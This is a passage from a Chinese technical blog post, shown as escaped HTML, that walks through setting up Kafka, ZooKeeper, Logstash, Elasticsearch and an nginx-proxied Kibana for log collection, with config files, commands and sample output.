-nltp&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:32000             0.0.0.0:*                   LISTEN      2517/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:5601           0.0.0.0:*                   LISTEN      6474/node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:10050          0.0.0.0:*                   LISTEN      305/zabbix_agentd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:9200           0.0.0.0:*                   LISTEN      5198/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 10.47.88.188:9300           0.0.0.0:*                   LISTEN      5198/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      25265/sshd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到我Github上面下载kabana启动脚本。&lt;/p&gt;
&lt;p&gt;es_01机器从es_02机器拷贝过去修改下配置就可以。 &lt;/p&gt;
&lt;h3 id=&quot;kibana安装插件参考：&quot;&gt;&lt;a href=&quot;#kibana安装插件参考：&quot; class=&quot;headerlink&quot; title=&quot;kibana安装插件参考：&quot;&gt;&lt;/a&gt;kibana安装插件参考：&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.elastic.co/guide/en/marvel/current/installing-marvel.html#installing-marvel&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Installing Marvel&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里kibana我做了nginx反向代理，集群代理。&lt;/p&gt;
&lt;h3 id=&quot;nginx配置kibana反向代理：&quot;&gt;&lt;a href=&quot;#nginx配置kibana反向代理：&quot; class=&quot;headerlink&quot; title=&quot;nginx配置kibana反向代理：&quot;&gt;&lt;/a&gt;nginx配置kibana反向代理：&lt;/h3&gt;&lt;p&gt;这里我只允许我公司IP访问：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;  upstream kibana.ihaozhuo.com &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server 10.47.88.206:5601 weight=1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server 10.47.88.188:5601 weight=1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  server &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        listen       80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server_name  kibana.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location / &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             index        index.html index.php index.jsp index.htm;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             allow 202.107.202.82/32;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             deny all;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_pass           http://kibana.ihaozhuo.com;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_ignore_client_abort on;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_redirect               off;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     Host    &lt;span class=&quot;variable&quot;&gt;$host&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     X-Real-IP       &lt;span class=&quot;variable&quot;&gt;$remote_addr&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             proxy_set_header     X-Forwarded-For &lt;span class=&quot;variable&quot;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;             &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;KafKa集群搭建&quot;&gt;&lt;a href=&quot;#KafKa集群搭建&quot; class=&quot;headerlink&quot; title=&quot;KafKa集群搭建&quot;&gt;&lt;/a&gt;KafKa集群搭建&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;下载地址：http://mirrors.hust.edu.cn/apache/kafka/0.9.0.0/kafka_2.10-0.9.0.0.tgz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 srv]&lt;span class=&quot;comment&quot;&gt;# tar -xvf kafka_2.10-0.9.0.0.tgz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 srv]&lt;span class=&quot;comment&quot;&gt;# mv kafka_2.10-0.9.0.0 kafka&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;修改kafka配置文件：&quot;&gt;&lt;a href=&quot;#修改kafka配置文件：&quot; class=&quot;headerlink&quot; title=&quot;修改kafka配置文件：&quot;&gt;&lt;/a&gt;修改kafka配置文件：&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_01 config]&lt;span class=&quot;comment&quot;&gt;# vim /srv/kafka/config/server.properties&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#设置brokerid（从0开始，3个节点分别设为0,1,2，不能重复）在这里id=0跟zookeeper id设置一样就行。 集群机器：按顺序写1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;broker.id=0  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#设置data目录，最好不要用默认的/tmp/kafka-logs&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /srv/kafka/data/kafka-logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#修改本地IP地址：&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;listeners=PLAINTEXT://10.46.72.172:9092&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#设置注册地址（重要，默认会把本机的hostanme注册到zk中，客户端连接时需要解析该hostanme，所以这里直接注册本机的IP地址，避免hostname解析失败，报错java.nio.channels.UnresolvedAddressException或java.io.IOException: Can not resolve address）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#设置zookeeper地址&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;zookeeper.connect=10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Kafka群集新建一个Topic&quot;&gt;&lt;a href=&quot;#Kafka群集新建一个Topic&quot; class=&quot;headerlink&quot; title=&quot;Kafka群集新建一个Topic&quot;&gt;&lt;/a&gt;Kafka群集新建一个Topic&lt;/h3&gt;&lt;p&gt;叫做logstash  Topic&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#查看tocpic列表（--zookeeper指定任意一个zk节点即可，用于获取集群信息）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#创建topic（--replication-factor表示复制到多少个节点，--partitions表示分区数，一般都设置为2或与节点数相等，不能大于总节点数）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#发送消息（--topic 指定topic）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;message1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;message2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#消费消息&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#replica检查&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每条发布到Kafka集群的消息都有一个类别，这个类别被称为topic。（物理上不同topic的消息分开存储，逻辑上一个topic的消息虽然保存于一个或多个broker上但用户只需指定消息的topic即可生产或消费数据而不必关心数据存于何处）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ElasticSearch&lt;/code&gt;机器&lt;code&gt;logstash&lt;/code&gt;把数据从&lt;code&gt;kafka&lt;/code&gt;存到&lt;code&gt;elasticsearch&lt;/code&gt;的配置&lt;/p&gt;
&lt;p&gt;其中选取kafka群集任意一个有zk的ip做连接使用&lt;/p&gt;
&lt;p&gt;&lt;code&gt;topic_id&lt;/code&gt;就是kafka中设置的&lt;code&gt;topic logstash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在es上面安装logstash配置&lt;br&gt;/usr/local/logstash/config/kafka_to_es.conf&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    kafka &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                zk_connect =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                group_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                reset_beginning =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)， default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                consumer_threads =&amp;gt; 2  &lt;span class=&quot;comment&quot;&gt;# number (optional)， default: 1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                decorate_events =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)， default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      hosts =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9200&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9200&quot;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      index =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;%&amp;#123;host&amp;#125;-%&amp;#123;+YYYY.MM.dd&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;# stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;新建了个测试的，测试下发送是否成功：/usr/local/logstash/config/stdin_to_es.conf &lt;/p&gt;
&lt;figure class=&quot;highlight puppet&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;input&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; stdin &amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;output&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;attr&quot;&gt;hosts&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206&quot;&lt;/span&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;stdout&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;attr&quot;&gt;codec&lt;/span&gt; =&amp;gt; rubydebug &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Step-2-启动服务&quot;&gt;&lt;a href=&quot;#Step-2-启动服务&quot; class=&quot;headerlink&quot; title=&quot;Step 2: 启动服务&quot;&gt;&lt;/a&gt;Step 2: 启动服务&lt;/h3&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Kafka用到了Zookeeper，所有首先启动Zookper，下面简单的启用一个单实例的Zookkeeper服务。可以在命令的结尾加个&amp;amp;符号，这样就可以启动后离开控制台。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#现在启动Kafka:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/srv/&lt;/span&gt;kafka&lt;span class=&quot;meta-keyword&quot;&gt;/bin/&lt;/span&gt;kafka-server-start.sh -daemon config/server.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#添加开机启动&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;echo ‘&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# start kafka&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;bin/kafka-server-start.sh -daemon &lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;config/server.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;‘ &amp;gt;&amp;gt; &lt;span class=&quot;meta-keyword&quot;&gt;/etc/&lt;/span&gt;rc.local&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#关闭&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;bin/kafka-server-stop.sh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;kafka配置防火墙：&quot;&gt;&lt;a href=&quot;#kafka配置防火墙：&quot; class=&quot;headerlink&quot; title=&quot;kafka配置防火墙：&quot;&gt;&lt;/a&gt;kafka配置防火墙：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;zookeeper集群&quot;&gt;&lt;a href=&quot;#zookeeper集群&quot; class=&quot;headerlink&quot; title=&quot;zookeeper集群&quot;&gt;&lt;/a&gt;zookeeper集群&lt;/h3&gt;&lt;p&gt;查看我之前写的这篇文档 &lt;a href=&quot;http://blog.yangcvo.me/2016/05/28/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/zookeeper/ZooKeeper%E9%9B%86%E7%BE%A4%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BC%98%E5%8C%96/&quot;&gt;ZooKeeper的集群快速搭建与优化&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;走kafka查看是否所有节点都启动：&quot;&gt;&lt;a href=&quot;#走kafka查看是否所有节点都启动：&quot; class=&quot;headerlink&quot; title=&quot;走kafka查看是否所有节点都启动：&quot;&gt;&lt;/a&gt;走kafka查看是否所有节点都启动：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_03 bin]&lt;span class=&quot;comment&quot;&gt;# sh zkCli.sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connecting to localhost:2181&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,849 [myid:] - INFO  [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:host.name=kafka_03&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:java.version=1.8.0_66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.vendor=Oracle Corporation&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client 